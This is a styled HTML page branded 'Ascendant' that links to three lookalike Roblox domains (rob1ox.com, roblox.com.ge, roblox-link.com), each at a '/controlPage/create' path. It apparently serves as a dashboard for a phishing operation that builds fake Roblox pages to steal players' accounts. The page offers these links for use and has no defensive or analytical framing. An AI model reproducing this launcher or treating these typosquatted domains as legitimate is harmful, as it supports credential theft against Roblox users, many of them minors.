<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ascendant - Sites</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #121212;
            overflow: hidden;
            font-family: 'Arial', sans-serif;
        }

        .container {
            display: flex;
            gap: 30px;
            position: relative;
            z-index: 1;
        }

        .box {
            display: flex;
            justify-content: center;
            align-items: center;
            width: 150px;
            height: 150px;
            text-decoration: none;
            border-radius: 15px;
            background: linear-gradient(135deg, #ff6f6f, #d84c3c);
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.5);
            transition: transform 0.5s ease, box-shadow 0.5s ease;
            color: #ffffff;
            font-weight: 700;
            font-size: 20px;
            text-align: center;
            z-index: 2;
            position: relative;
            overflow: hidden;
        }

        .box:hover {
            transform: translateY(-10px);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.7);
        }

        .box::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.2), rgba(255, 255, 255, 0));
            transform: rotate(45deg);
            transition: transform 0.5s ease;
        }

        .box:hover::before {
            transform: rotate(45deg) translate(50%, 50%);
        }

        .overlay-text {
            position: absolute;
            top: 10%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 48px;
            font-weight: bold;
            color: #ff6f6f;
            text-shadow: 2px 2px 8px rgba(0, 0, 0, 0.7);
            z-index: 3;
        }

        .overlay-text span {
            display: inline-block;
            animation: glow 2s infinite alternate;
        }

        @keyframes glow {
            from { text-shadow: 0 0 10px #ff6f6f, 0 0 20px #d84c3c, 0 0 30px #ff6f6f; }
            to { text-shadow: 0 0 20px #ff6f6f, 0 0 30px #d84c3c, 0 0 40px #ff6f6f; }
        }
    </style>
</head>
<body>
    <div class="overlay-text">
        <span>ASCENDANT</span>
    </div>
    <div class="container">
        <a href="https://rob1ox.com/controlPage/create" class="box">rob1ox.com</a>
        <a href="https://roblox.com.ge/controlPage/create" class="box">roblox.com.ge</a>
        <a href="https://roblox-link.com/controlPage/create" class="box">roblox-link.com</a>
    </div>
</body>
</html>
